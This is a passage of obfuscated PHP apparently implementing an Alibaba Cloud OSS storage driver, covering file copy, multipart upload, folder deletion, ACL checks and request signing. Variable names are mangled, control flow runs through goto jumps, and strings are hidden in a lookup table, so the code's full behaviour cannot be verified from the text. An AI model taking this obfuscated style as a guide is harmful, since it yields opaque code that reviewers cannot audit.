$c§¶¨†Ö‹ = trim($c§¶¨†Ö‹, $a®²˜ËŸ¡[8]); $C»£ô¸õ » = empty($c§¶¨†Ö‹) ? $a®²˜ËŸ¡[33] : $c§¶¨†Ö‹ . $a®²˜ËŸ¡[8]; goto BÎ‚ô³’¢Ë; BÎ‚ô³’¢Ë: $d‚¬¤È¤Ùô = $a®²˜ËŸ¡[33]; $a¸­ù³ = 1000; $cËƒÀ¢éÚŞ = $this->listItemCache === !1 ? !1 : !0; goto fÊ™ÇŒÛë; e¶è«Õñ‚™: } public function copyFile($AÃ¹ê±¾°¶, $aÌö¹°¥¸²) { $cÎÄãİá¼ë = $this->size($AÃ¹ê±¾°¶); if ($cÎÄãİá¼ë < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $AÃ¹ê±¾°¶, $this->bucket, $this->pathEncode($aÌö¹°¥¸²)); } catch (OSS\Core\OssException $EÃñ‰ğÚ°Ÿ) { return !1; } return $this->getPathOuter($aÌö¹°¥¸²); } $F†ğ¯Ñ ¤¶ = $this->multiCopyObject($AÃ¹ê±¾°¶, $aÌö¹°¥¸², $cÎÄãİá¼ë); return $F†ğ¯Ñ ¤¶ ? $this->getPathOuter($aÌö¹°¥¸²) : !1; } private function multiCopyObject($D•ë´©å¾ , $D’´Öã©¾›, $EÂøÚÄĞå¨) { $e£ÇÈ£¯¶ =& $_SERVER[Â€Á›¨õ]; try { goto D˜‚œƒåô½; fääŸ£˜Ìé: $BôÁÇøßÒ” = 1; $d ºŒÃ²õ = 0; $dË±Í£‡„ë = array(); goto bÆîÄˆØæÑ; D˜‚œƒåô½: $F±™™Í‹ = array(); if ($dÛÒªµí¦· = $this->hashMd5($D•ë´©å¾ )) { $F±™™Í‹ = array(OSS\OssClient::OSS_HEADERS => array($e£ÇÈ£¯¶[1250] => $dÛÒªµí¦·)); } $Bæ¿¥îÌ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($D’´Öã©¾›), $F±™™Í‹); goto fääŸ£˜Ìé; d¸¡½ƒ·Úò: $AåŸ–·Áïƒ = array(); foreach ($dË±Í£‡„ë as $e£Óé°ç¨¾ => $c„ÎˆˆÚ‡§) { $AåŸ–·Áïƒ[] = array($e£ÇÈ£¯¶[1254] => $e£Óé°ç¨¾ + 1, $e£ÇÈ£¯¶[1255] => $c„ÎˆˆÚ‡§); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($D’´Öã©¾›), $Bæ¿¥îÌ, $AåŸ–·Áïƒ); goto B¨É»ğ¹â; bÆîÄˆØæÑ: $c–ŞÖéç¤„ = 1024 * 1024 * 10; $dæÈ®¼™ôÇ = $this->client->generateMultiuploadParts($EÂøÚÄĞå¨, $c–ŞÖéç¤„); foreach ($dæÈ®¼™ôÇ as $e£Óé°ç¨¾ => $eÎĞ‚Â–Ş) { $Bíš‡Ü = $d ºŒÃ²õ + (int) $eÎĞ‚Â–Ş[$e£ÇÈ£¯¶[1251]]; $Aê É³Ÿ•Ö = (int) $eÎĞ‚Â–Ş[$e£ÇÈ£¯¶[333]] + $Bíš‡Ü - 1; $Bƒ¢ß›ïŠ‡ = array($e£ÇÈ£¯¶[1252] => $Bíš‡Ü, $e£ÇÈ£¯¶[1253] => $Aê É³Ÿ•Ö); $dË±Í£‡„ë[] = $this->client->uploadPartCopy($this->bucket, $D•ë´©å¾ , $this->bucket, $this->pathEncode($D’´Öã©¾›), $BôÁÇøßÒ”, $Bæ¿¥îÌ, $Bƒ¢ß›ïŠ‡); $BôÁÇøßÒ” = $BôÁÇøßÒ” + 1; } goto d¸¡½ƒ·Úò; B¨É»ğ¹â: } catch (OSS\Core\OssException $e‡äÅÉ‡õ) { return !1; } return !0; } public function moveFile($dŒéÂ’©éŠ, $a•Š²°’˜) { if ($this->copyFile($dŒéÂ’©éŠ, $a•Š²°’˜)) { $this->remove($dŒéÂ’©éŠ); return $this->getPathOuter($a•Š²°’˜); } return !1; } public function delFile($eå‹êáç‰) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($eå‹êáç‰)); } catch (OSS\Core\OssException $c¤ìİÁîß) { return !1; } return !0; } public function delFolder($CÒò¸ßğĞÃ) { goto eˆ¤ë±‡«Í; FÖÖïÎİì¬: return $this->delByBatch($EöäË¶»¿Í[$d¿¢²ÊãÕ´[74]]); goto f¿½©İ‰; bÈ’ÇÅÛ«²: if (!empty($CÒò¸ßğĞÃ) && !in_array($e­Àõ ×¬Ü, $EöäË¶»¿Í[$d¿¢²ÊãÕ´[74]])) { $EöäË¶»¿Í[$d¿¢²ÊãÕ´[74]][] = $e­Àõ ×¬Ü; } $AÆ±“ÓãÏ‘ = $this->delByBatch($EöäË¶»¿Í[$d¿¢²ÊãÕ´[73]]); if (!$AÆ±“ÓãÏ‘) { return !1; } goto FÖÖïÎİì¬; c‘Ë ˆ¢Ï¸: $EöäË¶»¿Í = $this->fileList($CÒò¸ßğĞÃ); $this->listItemCache = !0; $e­Àõ ×¬Ü = trim($CÒò¸ßğĞÃ, $d¿¢²ÊãÕ´[8]) . $d¿¢²ÊãÕ´[8]; goto bÈ’ÇÅÛ«²; eˆ¤ë±‡«Í: $d¿¢²ÊãÕ´ =& $_SERVER[Â€Á›¨õ]; if (!$this->exist($CÒò¸ßğĞÃ)) { return !0; } $this->listItemCache = !1; goto c‘Ë ˆ¢Ï¸; f¿½©İ‰: } private function delByBatch($EñÓ†ïª™) { foreach (array_chunk($EñÓ†ïª™, 1000) as $E‰µêÇÇŠ) { try { $this->client->deleteObjects($this->bucket, $E‰µêÇÇŠ); } catch (OSS\Core\OssException $DôøˆÁ´³ï) { return !1; } } return !0; } public function rename($bõÄ°®Õ„Î, $fÆ°¯Úµ§±) { return $this->renameObject($bõÄ°®Õ„Î, $fÆ°¯Úµ§±); } private function fileInfo($B‘ÌäØæ·˜, $AÅ¤’×—Ñğ = false, $Bº»ê¬áÒ = array()) { goto dŠÉà«øˆŒ; B÷ÛÔ‰½¿¶: $eƒÒ¤Í¦ƒé[$AÆÚŠêóÕ[192]] = $eƒÒ¤Í¦ƒé[$AÆÚŠêóÕ[83]] = 0; $eƒÒ¤Í¦ƒé[$AÆÚŠêóÕ[193]] = $eƒÒ¤Í¦ƒé[$AÆÚŠêóÕ[194]] = !0; if (empty($Bº»ê¬áÒ)) { $EŠç·…ÒÎ¡ = $this->objectMeta($B‘ÌäØæ·˜); if (!$EŠç·…ÒÎ¡) { return $eƒÒ¤Í¦ƒé; } $Bº»ê¬áÒ = array($AÆÚŠêóÕ[83] => strtotime($EŠç·…ÒÎ¡[$AÆÚŠêóÕ[1249]]), $AÆÚŠêóÕ[77] => $EŠç·…ÒÎ¡[$AÆÚŠêóÕ[1248]] + 0); } goto DˆÒƒÓÒ˜ƒ; eã†Ñ™°‡: return $eƒÒ¤Í¦ƒé; goto CÄø¿àœ×; DˆÒƒÓÒ˜ƒ: if (isset($Bº»ê¬áÒ[$AÆÚŠêóÕ[77]])) { $eƒÒ¤Í¦ƒé[$AÆÚŠêóÕ[77]] = $Bº»ê¬áÒ[$AÆÚŠêóÕ[77]]; } if (isset($Bº»ê¬áÒ[$AÆÚŠêóÕ[83]])) { $eƒÒ¤Í¦ƒé[$AÆÚŠêóÕ[83]] = $Bº»ê¬áÒ[$AÆÚŠêóÕ[83]]; } if (isset($Bº»ê¬áÒ[$AÆÚŠêóÕ[195]]) && !trim($eƒÒ¤Í¦ƒé[$AÆÚŠêóÕ[83]])) { $eƒÒ¤Í¦ƒé[$AÆÚŠêóÕ[83]] = $Bº»ê¬áÒ[$AÆÚŠêóÕ[195]]; } goto eã†Ñ™°‡; dŠÉà«øˆŒ: $AÆÚŠêóÕ =& $_SERVER[Â€Á›¨õ]; $eƒÒ¤Í¦ƒé = array($AÆÚŠêóÕ[28] => $this->pathThis($B‘ÌäØæ·˜), $AÆÚŠêóÕ[75] => $this->getPathOuter($B‘ÌäØæ·˜), $AÆÚŠêóÕ[29] => $AÆÚŠêóÕ[173], $AÆÚŠêóÕ[77] => isset($Bº»ê¬áÒ[$AÆÚŠêóÕ[77]]) ? $Bº»ê¬áÒ[$AÆÚŠêóÕ[77]] : 0, $AÆÚŠêóÕ[167] => $this->ext($B‘ÌäØæ·˜)); if ($AÅ¤’×—Ñğ) { return $eƒÒ¤Í¦ƒé; } goto B÷ÛÔ‰½¿¶; CÄø¿àœ×: } private function folderInfo($cíÎ»¸ÀÜ, $aç²‚–‡ÔÆ = false, $a”ê‹ò‰ğí = array()) { goto BêÁ×ŠÁ¢¨; A„‚İ¬¤íÆ: if (isset($a”ê‹ò‰ğí[$f–ï¦œî¨†[83]])) { $CÙÑº ¶ñ[$f–ï¦œî¨†[83]] = $a”ê‹ò‰ğí[$f–ï¦œî¨†[83]]; } if (isset($a”ê‹ò‰ğí[$f–ï¦œî¨†[192]])) { $CÙÑº ¶ñ[$f–ï¦œî¨†[192]] = $a”ê‹ò‰ğí[$f–ï¦œî¨†[192]]; } return $CÙÑº ¶ñ; goto d…ñéé›ÇÍ; BêÁ×ŠÁ¢¨: $f–ï¦œî¨† =& $_SERVER[Â€Á›¨õ]; $CÙÑº ¶ñ = array($f–ï¦œî¨†[28] => $this->pathThis($cíÎ»¸ÀÜ), $f–ï¦œî¨†[75] => $this->getPathOuter($f–ï¦œî¨†[8] . $cíÎ»¸ÀÜ), $f–ï¦œî¨†[29] => $f–ï¦œî¨†[76]); if ($aç²‚–‡ÔÆ) { return $CÙÑº ¶ñ; } goto aõÉº˜Š; aõÉº˜Š: $CÙÑº ¶ñ[$f–ï¦œî¨†[192]] = $CÙÑº ¶ñ[$f–ï¦œî¨†[83]] = 0; $CÙÑº ¶ñ[$f–ï¦œî¨†[193]] = $CÙÑº ¶ñ[$f–ï¦œî¨†[194]] = !0; if (empty($a”ê‹ò‰ğí)) { $cíÎ»¸ÀÜ = rtrim($cíÎ»¸ÀÜ, $f–ï¦œî¨†[8]) . $f–ï¦œî¨†[8]; $C²Ç‚ï¸Ï = $this->objectMeta($cíÎ»¸ÀÜ); if (!$C²Ç‚ï¸Ï) { return $CÙÑº ¶ñ; } $a”ê‹ò‰ğí = array($f–ï¦œî¨†[192] => $C²Ç‚ï¸Ï[$f–ï¦œî¨†[1256]][$f–ï¦œî¨†[1257]], $f–ï¦œî¨†[83] => strtotime($C²Ç‚ï¸Ï[$f–ï¦œî¨†[1249]])); } goto A„‚İ¬¤íÆ; d…ñéé›ÇÍ: } public function listPath($bŠ«ã±ÇÍÌ, $bí¼ß‰ÔòŒ = false) { $CÆ¨ò÷Ö¥Ğ =& $_SERVER[Â€Á›¨õ]; $bé÷§ô’ğ› = $this->fileList($bŠ«ã±ÇÍÌ, $CÆ¨ò÷Ö¥Ğ[8], !0); foreach ($bé÷§ô’ğ›[$CÆ¨ò÷Ö¥Ğ[74]] as $BÕ±œğ½Í => $dÀÄ¥’Î) { $bé÷§ô’ğ›[$CÆ¨ò÷Ö¥Ğ[74]][$BÕ±œğ½Í] = $this->folderInfo($dÀÄ¥’Î, $bí¼ß‰ÔòŒ, $dÀÄ¥’Î); } foreach ($bé÷§ô’ğ›[$CÆ¨ò÷Ö¥Ğ[73]] as $BÕ±œğ½Í => $dÀÄ¥’Î) { $bé÷§ô’ğ›[$CÆ¨ò÷Ö¥Ğ[73]][$BÕ±œğ½Í] = $this->fileInfo($dÀÄ¥’Î[$CÆ¨ò÷Ö¥Ğ[28]], $bí¼ß‰ÔòŒ, $dÀÄ¥’Î); } return $bé÷§ô’ğ›; } public function has($CŠ©î‘˜×°, $AİÙ®ÊÊº¤ = false, $cÌö¯£³¬ª = true) { goto aÍöĞêôšæ; fÒèµƒĞêÖ: $DÊ†¬Ç¥– = $BäŸ·º[33]; $dÕ…«î = 500; $Eí¸™Ó‹£ = $fÁšæ‹•© = 0; goto f›ÖÏÕ‰ÙÄ; f›ÖÏÕ‰ÙÄ: while (!0) { check_abort(); $EİÌË¯Ç°Ö = array($BäŸ·º[1244] => $BäŸ·º[8], $BäŸ·º[1245] => $C¥‡¨Ù¼…ë, $BäŸ·º[1246] => $dÕ…«î, $BäŸ·º[1247] => $DÊ†¬Ç¥–); try { $dì£ÕĞ¨»Ñ = $this->client->listObjects($this->bucket, $EİÌË¯Ç°Ö); } catch (OSS\Core\OssException $côà™†‹Š–) { break; } $DÊ†¬Ç¥– = $dì£ÕĞ¨»Ñ->getNextMarker(); $B‹¯” ôÄ = $dì£ÕĞ¨»Ñ->getObjectList(); $A¹ÙøñóÇ = $dì£ÕĞ¨»Ñ->getPrefixList(); if ($AİÙ®ÊÊº¤) { if (count($B‹¯” ôÄ) > 1 || count($B‹¯” ôÄ) == 1 && $B‹¯” ôÄ[0]->getKey() != $C¥‡¨Ù¼…ë) { $Eí¸™Ó‹£ += count($B‹¯” ôÄ) - 1; } if (!empty($A¹ÙøñóÇ)) { $fÁšæ‹•© += count($A¹ÙøñóÇ); } if ($DÊ†¬Ç¥– === $BäŸ·º[33]) { break; } continue; } if ($cÌö¯£³¬ª) { if (!empty($B‹¯” ôÄ)) { if (count($B‹¯” ôÄ) > 1 || $B‹¯” ôÄ[0]->getKey() != $C¥‡¨Ù¼…ë) { return !0; } } } else { if (!empty($A¹ÙøñóÇ)) { return !0; } } if ($DÊ†¬Ç¥– === $BäŸ·º[33]) { break; } } if ($AİÙ®ÊÊº¤) { return array($BäŸ·º[201] => $Eí¸™Ó‹£, $BäŸ·º[202] => $fÁšæ‹•©); } return !1; goto eŞğ¶Ìˆ‡·; aÍöĞêôšæ: $BäŸ·º =& $_SERVER[Â€Á›¨õ]; $CŠ©î‘˜×° = trim($CŠ©î‘˜×°, $BäŸ·º[8]); $C¥‡¨Ù¼…ë = empty($CŠ©î‘˜×°) ? $BäŸ·º[33] : $CŠ©î‘˜×° . $BäŸ·º[8]; goto fÒèµƒĞêÖ; eŞğ¶Ìˆ‡·: } public function listAll($D©ƒÚ½ä¸¬) { $bŞòÊ¬…Éµ =& $_SERVER[Â€Á›¨õ]; $F»¶„‘Ş = $this->fileList($D©ƒÚ½ä¸¬, $bŞòÊ¬…Éµ[33], !0); $A®Ï¬Ú÷Öµ = array(); foreach ($F»¶„‘Ş[$bŞòÊ¬…Éµ[73]] as $BÏ…µß±ù) { $A®Ï¬Ú÷Öµ[$BÏ…µß±ù[$bŞòÊ¬…Éµ[28]]] = $BÏ…µß±ù[$bŞòÊ¬…Éµ[77]]; } foreach ($F»¶„‘Ş[$bŞòÊ¬…Éµ[74]] as $BÏ…µß±ù) { if (is_string($BÏ…µß±ù)) { $A®Ï¬Ú÷Öµ[$BÏ…µß±ù] = 0; } } return $this->listAllFiles($D©ƒÚ½ä¸¬, array_keys($A®Ï¬Ú÷Öµ), $A®Ï¬Ú÷Öµ); } public function canRead($A†Ä‡ƒ‘—Ñ) { $BİÁà¶Ñ£Ó =& $_SERVER[Â€Á›¨õ]; $C’õîÕÖí¨ = $this->pathAcl($A†Ä‡ƒ‘—Ñ); return $C’õîÕÖí¨ == $BİÁà¶Ñ£Ó[1258] || $C’õîÕÖí¨ == $BİÁà¶Ñ£Ó[514] ? !0 : !1; } public function canWrite($FÆ’Ñ¯¢) { $B‰‡Âë£ = $this->pathAcl($FÆ’Ñ¯¢); return $B‰‡Âë£ == $_SERVER[Â€Á›¨õ][514] ? !0 : !1; } public function pathAcl($Bèãà§êœ´) { goto AõõœÈÌÀÀ; EßÇ×‹Í„¿: $cÄ¥–Üè· = $EÃ«İçŞ == $aâìá¾ƒâî[34] ? $this->bucketAcl : $EÃ«İçŞ; if ($cÄ¥–Üè· == $aâìá¾ƒâî[1259]) { return $aâìá¾ƒâî[1258]; } if ($cÄ¥–Üè· == $aâìá¾ƒâî[1260]) { return $aâìá¾ƒâî[514]; } goto CâöòŒ½ÆÕ; CâöòŒ½ÆÕ: return $cÄ¥–Üè·; goto Bğ±‘Œ ÃÜ; AõõœÈÌÀÀ: $aâìá¾ƒâî =& $_SERVER[Â€Á›¨õ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $EÃ«İçŞ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Bèãà§êœ´)); } catch (OSS\Core\OssException $aœ×÷£áŞ) { return !1; } goto EßÇ×‹Í„¿; Bğ±‘Œ ÃÜ: } private function chmodPath($BƒÁ§øà, $EÆĞµ£ˆëÓ = '') { $E©êĞÖ™º¥ =& $_SERVER[Â€Á›¨õ]; $d¥Œ©¼‹Ìí = empty($EÆĞµ£ˆëÓ) ? $E©êĞÖ™º¥[1260] : $EÆĞµ£ˆëÓ; $C›»ÖÄ« = array($E©êĞÖ™º¥[34], $E©êĞÖ™º¥[191], $E©êĞÖ™º¥[1259], $E©êĞÖ™º¥[1260]); if (!in_array($d¥Œ©¼‹Ìí, $C›»ÖÄ«)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($BƒÁ§øà), $d¥Œ©¼‹Ìí); } catch (OSS\Core\OssException $dçÇì‘İÂÉ) { return !1; } return !0; } public function getContent($aåµÚøš‡ë) { return $this->fileSubstr($aåµÚøš‡ë, -1); } public function setContent($BßŸ§¶‚Æ, $F¢Ì»â„ = '') { $BŞ„±êğù« =& $_SERVER[Â€Á›¨õ]; try { $D‚ÔöÇ¢Àî = $this->trafficLimit($BŞ„±êğù«[1261]); $C±œåÈÀ•ä = $this->client->putObject($this->bucket, $this->pathEncode($BßŸ§¶‚Æ), $F¢Ì»â„, $D‚ÔöÇ¢Àî); } catch (OSS\Core\OssException $dË›‡Øì™Ğ) { return !1; } $EÔ·ÖÇ‘ç = array($BŞ„±êğù«[1250] => trim($C±œåÈÀ•ä[$BŞ„±êğù«[1262]], $BŞ„±êğù«[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($BßŸ§¶‚Æ))); $this->updateObjMeta($BßŸ§¶‚Æ, $EÔ·ÖÇ‘ç); return isset($C±œåÈÀ•ä[$BŞ„±êğù«[1263]][$BŞ„±êğù«[1207]]) ? !0 : !1; } private function updateObjMeta($cß™©¾àï, $DéÕ‚©Îš) { $cß™©¾àï = $this->pathEncode($cß™©¾àï); try { $CÙ¤Ó·¯ªŞ = array(OSS\OssClient::OSS_HEADERS => $DéÕ‚©Îš); $this->client->copyObject($this->bucket, $cß™©¾àï, $this->bucket, $cß™©¾àï, $CÙ¤Ó·¯ªŞ); } catch (OSS\Core\OssException $Dê»ˆŒª¾«) { return !1; } return !0; } public function upload($D´¯Ã¬º¼é, $côÖñÍèÊ, $B¯İ»Ïˆß÷ = false, $DÙÁÅÃÎ = REPEAT_REPLACE) { $cá‹¼¸©Œ› =& $_SERVER[Â€Á›¨õ]; $D³Óºâ’°© = trim($D´¯Ã¬º¼é, $cá‹¼¸©Œ›[8]); $f»©‰²‰×¿ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($cá‹¼¸©Œ›[1250] => @md5_file($côÖñÍèÊ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($D´¯Ã¬º¼é))); $f»©‰²‰×¿ = $this->trafficLimit($cá‹¼¸©Œ›[1261], $f»©‰²‰×¿); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($D³Óºâ’°©), $côÖñÍèÊ, $f»©‰²‰×¿); } catch (OSS\Core\OssException $eÒÄ²Å†öÏ) { return !1; } return $this->getPathOuter($D´¯Ã¬º¼é); } public function getHost() { $C‡äÈØë³‰ =& $_SERVER[Â€Á›¨õ]; $cø˜Çøî˜ = explode($C‡äÈØë³‰[177], parent::getHost()); return $cø˜Çøî˜[0] . $C‡äÈØë³‰[177] . $this->bucket . $C‡äÈØë³‰[94] . $cø˜Çøî˜[1]; } public function uploadFormData($D›ŠÄõ·«ğ, $B¬ÄˆßŞ„ = 3600) { goto bö±ò“áÄ; bö±ò“áÄ: $FËà©¥¤àö =& $_SERVER[Â€Á›¨õ]; if (!($eêÍ©ÜŸ¨• = $this->getHost())) { return !1; } $b‚ØÒ¬ÉÛ– = $B¬ÄˆßŞ„; goto FÊ±—¯¹ËØ; b‹Û¤†××˜: $e¥Ë§éÅÇ² = strpos($Bë«•Ø²¼ê, $FËà©¥¤àö[292]); $Bë«•Ø²¼ê = substr($Bë«•Ø²¼ê, 0, $e¥Ë§éÅÇ²) . $FËà©¥¤àö[1265]; $bº¥‚Ë°õ” = 1048576000 * 5; goto F²ƒÅ‹µ†å; D‚æÉÙ“¬ö: $eŒ‡È—§³ = base64_encode(hash_hmac($FËà©¥¤àö[228], $e³Š¹å­ù, $this->secret, !0)); $Bóî«ˆÄ…Ô = array($FËà©¥¤àö[1173] => $e³Š¹å­ù, $FËà©¥¤àö[1267] => $this->accessKey, $FËà©¥¤àö[1169] => $FËà©¥¤àö[1161], $FËà©¥¤àö[1268] => $eŒ‡È—§³, $FËà©¥¤àö[175] => $eêÍ©ÜŸ¨•); $Bóî«ˆÄ…Ô = $this->trafficLimit($FËà©¥¤àö[1261], $Bóî«ˆÄ…Ô); goto DŞŞÉ¯ ‹¤; DŞŞÉ¯ ‹¤: return $Bóî«ˆÄ…Ô; goto E£ö‡’æ¾Ó; F²ƒÅ‹µ†å: $Aãæ¡åÂÔÄ = $this->pathFather($D›ŠÄõ·«ğ); $F¥´×Á¯«° = array($FËà©¥¤àö[1163] => $Bë«•Ø²¼ê, $FËà©¥¤àö[1164] => array(array($FËà©¥¤àö[1266], 0, $bº¥‚Ë°õ”), array($FËà©¥¤àö[1167], $FËà©¥¤àö[1168], $Aãæ¡åÂÔÄ))); $e³Š¹å­ù = base64_encode(json_encode($F¥´×Á¯«°)); goto D‚æÉÙ“¬ö; FÊ±—¯¹ËØ: $fÀ§©ÒÑßğ = date($FËà©¥¤àö[1264], time() + $b‚ØÒ¬ÉÛ–); $dˆ²ŞîŸ£„ = new DateTime($fÀ§©ÒÑßğ); $Bë«•Ø²¼ê = $dˆ²ŞîŸ£„->format(DateTime::ISO8601); goto b‹Û¤†××˜; E£ö‡’æ¾Ó: } public function multiUploadFormData($d…æÒ£É”, $DîµŸ«Ÿ× = 3600) { $aÂ¡ô†îó =& $_SERVER[Â€Á›¨õ]; if (!($bèƒ³Üâ»‚ = $this->getHost())) { return !1; } $eœ‚ÓôŞ = $this->trafficLimit($aÂ¡ô†îó[1261]); $F—­Àº§¦ø = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($d…æÒ£É”), $eœ‚ÓôŞ); return array($aÂ¡ô†îó[219] => $F—­Àº§¦ø, $aÂ¡ô†îó[175] => $bèƒ³Üâ»‚ . $aÂ¡ô†îó[8] . $this->pathEncode($d…æÒ£É”), $aÂ¡ô†îó[220] => gmdate($aÂ¡ô†îó[1269]), $aÂ¡ô†îó[92] => $d…æÒ£É”); } public function multiUploadAuthData($EŠ„†ìÅ—´, $dë‚¼ƒ…ˆÇ = array()) { goto B¦¤÷®´ä¬; EÀ®‹˜““´: $CÂ‡âÉ‚ñÏ = $EŠ„†ìÅ—´; if (isset($dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[92]])) { $CÂ‡âÉ‚ñÏ = $dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[92]]; unset($dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[92]]); } if (isset($dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[221]])) { $dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[220]] = $eá´àŒ‰Çõ; return $this->listUploadParts($CÂ‡âÉ‚ñÏ, $dë‚¼ƒ…ˆÇ); } goto Eç¶ŞâÕĞ; Eç¶ŞâÕĞ: $E¶ĞÌ°Ê¤ô = array($AĞ›Œö–µë[222], $AĞ›Œö–µë[33], $AĞ›Œö–µë[118], $eá´àŒ‰Çõ, "\170\x2d\157\163\163\55\144\x61\x74\x65\x3a{$eá´àŒ‰Çõ}", $AĞ›Œö–µë[8] . $this->bucket . $AĞ›Œö–µë[8] . $CÂ‡âÉ‚ñÏ . $F«²ŒØ¯„Œ); if (strpos($F«²ŒØ¯„Œ, $AĞ›Œö–µë[223]) === 0) { $E¶ĞÌ°Ê¤ô[0] = $AĞ›Œö–µë[224]; if ($cƒ‹×Ù²­¸ = $this->trafficLimit($AĞ›Œö–µë[1261])) { $CÂ‡âÉ‚ñÏ = $AĞ›Œö–µë[1270]; array_splice($E¶ĞÌ°Ê¤ô, 5, 0, $CÂ‡âÉ‚ñÏ . $AĞ›Œö–µë[4] . $cƒ‹×Ù²­¸[$CÂ‡âÉ‚ñÏ]); } } if (isset($dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[225]]) && $dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[225]] == $AĞ›Œö–µë[226]) { $E¶ĞÌ°Ê¤ô[0] = $AĞ›Œö–µë[226]; } goto aŒ„½×Àô; aŒ„½×Àô: if (!empty($dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[1271]])) { $FÇªºªè¯ = array_merge(array($E¶ĞÌ°Ê¤ô[4]), $dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[1271]]); sort($FÇªºªè¯); $E¶ĞÌ°Ê¤ô[4] = implode($AĞ›Œö–µë[227], $FÇªºªè¯); } $cñ‰âÄ‡Ñ = implode($AĞ›Œö–µë[227], $E¶ĞÌ°Ê¤ô); $F×ïå‹ŸÌ = base64_encode(hash_hmac($AĞ›Œö–µë[228], $cñ‰âÄ‡Ñ, $this->secret, !0)); goto E‡µÃ‰Ê’‰; B¦¤÷®´ä¬: $AĞ›Œö–µë =& $_SERVER[Â€Á›¨õ]; $eá´àŒ‰Çõ = isset($dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[220]]) ? $dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[220]] : gmdate($AĞ›Œö–µë[1269]); $F«²ŒØ¯„Œ = isset($dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[167]]) ? $dë‚¼ƒ…ˆÇ[$AĞ›Œö–µë[167]] : $AĞ›Œö–µë[33]; goto EÀ®‹˜““´; E‡µÃ‰Ê’‰: $B¿¡ÃÖ†ŒÏ = $AĞ›Œö–µë[1234] . $this->accessKey . $AĞ›Œö–µë[4] . $F×ïå‹ŸÌ; if (strpos($F«²ŒØ¯„Œ, $AĞ›Œö–µë[223]) === 0) { $B¿¡ÃÖ†ŒÏ = array($AĞ›Œö–µë[230] => $B¿¡ÃÖ†ŒÏ, $AĞ›Œö–µë[220] => $eá´àŒ‰Çõ); if ($cƒ‹×Ù²­¸) { $B¿¡ÃÖ†ŒÏ = array_merge($B¿¡ÃÖ†ŒÏ, $cƒ‹×Ù²­¸); } } return $B¿¡ÃÖ†ŒÏ; goto a¶ç£®èÀÀ; a¶ç£®èÀÀ: } public function listUploadParts($B§×Âõİ£, $d­Ë«‹£Êˆ) { goto C“èÛ×Äæ§; dİƒåòß: unset($d­Ë«‹£Êˆ[$aÀ¿¯ºÜôï[221]], $d­Ë«‹£Êˆ[$aÀ¿¯ºÜôï[225]]); $D¿Ş›Ì‰†” = $this->multiUploadAuthData($B§×Âõİ£, $d­Ë«‹£Êˆ); if (empty($D¿Ş›Ì‰†”)) { return !1; } goto DŠìÖïàÌº; C“èÛ×Äæ§: $aÀ¿¯ºÜôï =& $_SERVER[Â€Á›¨õ]; $c¿õÏïÏ‘  = parse_url_query($d­Ë«‹£Êˆ[$aÀ¿¯ºÜôï[167]]); $C‘ˆà¬’ = $this->client->listParts($this->bucket, $this->pathEncode($B§×Âõİ£), $c¿õÏïÏ‘ [$aÀ¿¯ºÜôï[219]]); goto B›¤¸Êâ¿ƒ; DŠìÖïàÌº: return array($aÀ¿¯ºÜôï[230] => $D¿Ş›Ì‰†”, $aÀ¿¯ºÜôï[220] => $d­Ë«‹£Êˆ[$aÀ¿¯ºÜôï[220]], $aÀ¿¯ºÜôï[232] => $få’ ĞÍà); goto C£³áÓÒ†Í; B›¤¸Êâ¿ƒ: $B‘‹…Æùˆê = $C‘ˆà¬’->getListPart(); $få’ ĞÍà = array(); foreach ($B‘‹…Æùˆê as $C„… –ï‡ƒ) { $få’ ĞÍà[] = array($aÀ¿¯ºÜôï[1254] => $C„… –ï‡ƒ->getPartNumber(), $aÀ¿¯ºÜôï[1255] => trim($C„… –ï‡ƒ->getETag(), $aÀ¿¯ºÜôï[115])); } goto dİƒåòß; C£³áÓÒ†Í: } public function download($DÈîùÇÚ, $AÙÙÈÒÖ‘ß) { if ($this->isFolder($DÈîùÇÚ)) { return !1; } try { $cãëÈ¥†Áğ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $AÙÙÈÒÖ‘ß); $cãëÈ¥†Áğ = $this->trafficLimit($_SERVER[Â€Á›¨õ][108], $cãëÈ¥†Áğ); $this->client->getObject($this->bucket, $this->pathEncode($DÈîùÇÚ), $cãëÈ¥†Áğ); } catch (OSS\Core\OssException $CŠ’ÁÈ ´Í) { return !1; } return $AÙÙÈÒÖ‘ß; } public function fileSubstr($e½ì³ŸŠâˆ, $D¿Ñ·œƒğ = 0, $eÉÅ§¢ÏÅ… = false) { if ($D¿Ñ·œƒğ === -1) { $AÛÍ¶È¾í = array(); } else { if ($eÉÅ§¢ÏÅ… === !1) { $b”Úè•Ü‘ = $this->size($e½ì³ŸŠâˆ); } else { $b”Úè•Ü‘ = $D¿Ñ·œƒğ + $eÉÅ§¢ÏÅ… - 1; } $AÛÍ¶È¾í = array(OSS\OssClient::OSS_RANGE => "{$D¿Ñ·œƒğ}\55{$b”Úè•Ü‘}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($e½ì³ŸŠâˆ), $AÛÍ¶È¾í); } catch (OSS\Core\OssException $dİâ±§Çİ¬) { 